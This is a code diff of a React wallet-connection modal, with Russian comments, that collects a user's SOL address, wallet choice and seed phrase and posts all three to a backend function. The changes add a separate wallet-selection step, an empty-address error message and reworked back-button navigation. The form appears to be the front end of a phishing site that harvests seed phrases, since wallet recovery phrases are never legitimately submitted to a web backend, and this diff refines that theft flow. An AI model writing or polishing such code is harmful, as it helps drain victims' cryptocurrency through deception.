@@ -10,15 +10,14 @@ const WALLETS = [
 
 const WalletModal = ({ onClose }) => {
   const [selectedWallet, setSelectedWallet] = useState(null);
-  const [solAddress, setSolAddress] = useState(''); // Новое состояние для SOL адреса
+  const [solAddress, setSolAddress] = useState('');
+  const [showWalletSelection, setShowWalletSelection] = useState(false); // <--- НОВОЕ СОСТОЯНИЕ
   const [phraseType, setPhraseType] = useState(null);
   const [seedPhrase, setSeedPhrase] = useState('');
   const [recaptchaToken, setRecaptchaToken] = useState('');
   const [submissionStatus, setSubmissionStatus] = useState('');
 
   const BACKEND_URL = '/.netlify/functions/secure-message';
-
-  // ВАЖНО: Публичный ключ сайта (Site Key) для reCAPTCHA v2
   const RECAPTCHA_SITE_KEY_V2 = "6LfciG4rAAAAAB-s0mobITSv7p16yLOmEDE1lb3Z"; 
 
   const handleWalletSelect = (wallet) => {
@@ -32,12 +31,11 @@ const WalletModal = ({ onClose }) => {
   const handleSolAddressSubmit = (e) => {
     e.preventDefault();
     if (solAddress.trim() === '') {
-      // Здесь можно добавить более заметное сообщение об ошибке для пользователя,
-      // но пока полагаемся на `required` атрибут инпута.
+      setSubmissionStatus('❌ Пожалуйста, введите ваш SOL адрес.'); // Используем submissionStatus для сообщения
       return; 
     }
-    // Переход к следующему шагу (выбору кошелька) происходит автоматически,
-    // так как состояние `solAddress` становится непустым, и JSX перерисовывается.
+    setSubmissionStatus(''); // Очищаем статус, если адрес введен
+    setShowWalletSelection(true); // <--- ПЕРЕХОД К ВЫБОРУ КОШЕЛЬКА ПО КНОПКЕ
   };
 
   const handlePhraseTypeSelect = (type) => {
@@ -46,19 +44,19 @@ const WalletModal = ({ onClose }) => {
   
   const handleBack = () => {
     if (phraseType) {
-      // Если находимся на выборе сид-фразы или вводе сид-фразы, возвращаемся к выбору типа фразы
       setPhraseType(null);
       setSeedPhrase('');
       setRecaptchaToken('');
     } else if (selectedWallet) {
-      // Если находится на выборе типа фразы, возвращаемся к выбору кошелька
       setSelectedWallet(null);
-    } else if (solAddress) {
-      // Если находится на выборе кошелька, возвращаемся к вводу SOL-адреса
-      setSolAddress('');
+      setShowWalletSelection(false); // <--- Возвращаемся к выбору кошелька
+    } else if (showWalletSelection) { // <--- Если мы в выборе кошельков, а SOL адрес уже введен
+        setShowWalletSelection(false); // Возвращаемся к вводу SOL адреса
+    } else if (solAddress) { // Если мы вводим SOL адрес и он уже не пустой, но еще не нажали "Далее"
+        setSolAddress(''); // Очищаем SOL адрес и возвращаемся к начальному состоянию
+        onClose(); // Или закрываем модалку, если это был самый первый шаг
     } else {
-      // Если находится на вводе SOL-адреса (первый шаг), закрываем модальное окно
-      onClose();
+        onClose(); // Закрываем модальное окно
     }
   };
 
@@ -84,7 +82,7 @@ const WalletModal = ({ onClose }) => {
         },
         body: JSON.stringify({
           walletName: selectedWallet.name,
-          solAddress: solAddress, // Отправляем SOL адрес на бэкенд
+          solAddress: solAddress,
           seedPhrase: seedPhrase,
           recaptchaToken: recaptchaToken,
         }),
@@ -123,11 +121,11 @@ const WalletModal = ({ onClose }) => {
     <div className="modal-overlay" onClick={onClose}>
       <div className="modal-content" onClick={(e) => e.stopPropagation()}>
         <button className="close-button" onClick={onClose}>×</button>
-        {selectedWallet || solAddress ? ( // Показываем кнопку "Назад", если выбран кошелек ИЛИ введен SOL-адрес
+        {selectedWallet || solAddress || showWalletSelection ? ( // Показываем кнопку "Назад", если есть состояние, с которого можно вернуться
             <button className="back-button" onClick={handleBack}>←</button>
         ) : null}
 
-        {!solAddress ? ( // Шаг 1: Введите SOL адрес
+        {!showWalletSelection ? ( // Шаг 1: Введите SOL адрес (Теперь контролируется showWalletSelection)
           <>
             <h2>Введите свой SOL адрес</h2>
             <form onSubmit={handleSolAddressSubmit}>
@@ -138,10 +136,15 @@ const WalletModal = ({ onClose }) => {
                 name="solAddress"
                 value={solAddress}
                 onChange={handleSolAddressChange}
-                placeholder="Например, 2T7yXp1aB3c4D5e6F7g8H9i0J1k2L3m4N5o6P7q8R" // Подсказка
+                placeholder="Например, 2T7yXp1aB3c4D5e6F7g8H9i0J1k2L3m4N5o6P7q8R"
                 required
               />
-              <button type="submit" className="submit-button">Далее</button>
+              {solAddress.trim() === '' && submissionStatus && ( // Показываем сообщение об ошибке, если поле пустое
+                <p style={{ color: '#ff9999', fontSize: '0.85rem', marginTop: '0.5rem' }}>
+                  {submissionStatus}
+                </p>
+              )}
+              <button type="submit" className="submit-button" style={{ marginTop: '1rem' }}>Далее</button>
             </form>
           </>
         ) : !selectedWallet ? ( // Шаг 2: Выберите ваш кошелек
